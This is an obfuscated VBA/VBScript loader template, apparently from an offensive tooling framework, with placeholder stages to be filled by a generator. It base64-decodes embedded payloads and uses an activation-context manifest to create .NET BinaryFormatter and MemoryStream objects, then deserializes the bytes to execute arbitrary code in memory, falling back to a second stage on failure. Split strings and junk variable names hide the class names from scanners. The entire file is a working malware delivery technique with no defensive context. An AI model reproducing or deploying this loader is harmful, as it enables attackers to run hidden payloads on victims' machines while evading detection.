Function deflate(ByVal eob)
    Dim nyz, war
    Set nyz = CreateObject("Msxm" & "l2.D" & "OMDocum" & "ent.3.0")
    Set war = nyz.CreateElement("ba" & "se64")
    war.dataType = "bin.bas" & "e64"
    war.Text = eob
    deflate = war.nodeTypedValue
    Set war = Nothing
    Set nyz = Nothing
End Function

Function Exec()
    
	Dim stage_1, stage_2

    %_STAGE1_%
    
    %_STAGE2_%

    Dim cap As Object, addi As Object
    
    manifest = "<?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?>"
	manifest = manifest & "<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">"
	manifest = manifest & "<assemblyIdentity name=""mscorlib"" version=""4.0.0.0"" publicKeyToken=""B77A5C561934E089"" />"
	manifest = manifest & "<clrClass clsid=""{D0CBA7AF-93F5-378A-BB11-2A5D9AA9C4D7}"" progid=""System.Runtime.Serialization"
	manifest = manifest & ".Formatters.Binary.BinaryFormatter"" threadingModel=""Both"" name=""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"" "
	manifest = manifest & "runtimeVersion=""v4.0.30319"" /><clrClass clsid=""{8D907846-455E-39A7-BD31-BC9F81468B47}"" "
	manifest = manifest & "progid=""System.IO.MemoryStream"" threadingModel=""Both"" name=""System.IO.MemoryStream"" runtimeVersion=""v4.0.30319"" /></assembly>"


    Set menf = CreateObject("Micro" & "soft.Win" & "dows.Act" & "Ctx")
    menf.ManifestText = manifest
        
    Set cap = menf.CreateObject("Syst" & "em.IO.M" & "emo" & "ryStream")
    Dim hvie
    hvie = "Syste"
    hvie = hvie & "m.Runtim"
    hvie = hvie & "e.Seri"
    hvie = hvie & "alization.Fo"
    hvie = hvie & "rmatters.B"
    hvie = hvie & "inary.Bi"
    hvie = hvie & "naryFormatter"
    Set addi = menf.CreateObject(hvie)

    Dim thol
    thol = deflate(stage_1)

    For Each i In thol
        cap.WriteByte i
    Next i

    On Error Resume Next

    cap.Position = 0
    Dim po1 As Object
    Set po1 = addi.Deserialize_2(cap)

    If Err.Number <> 0 Then
       Dim dar As Object
       
       Set dar = menf.CreateObject("System.IO.MemoryStream")

       Dim face
       face = deflate(stage_2)

       For Each j In face
        dar.WriteByte j
       Next j

       dar.Position = 0
       Dim noth As Object
       Set noth = addi.Deserialize_2(dar)
    End If

End Function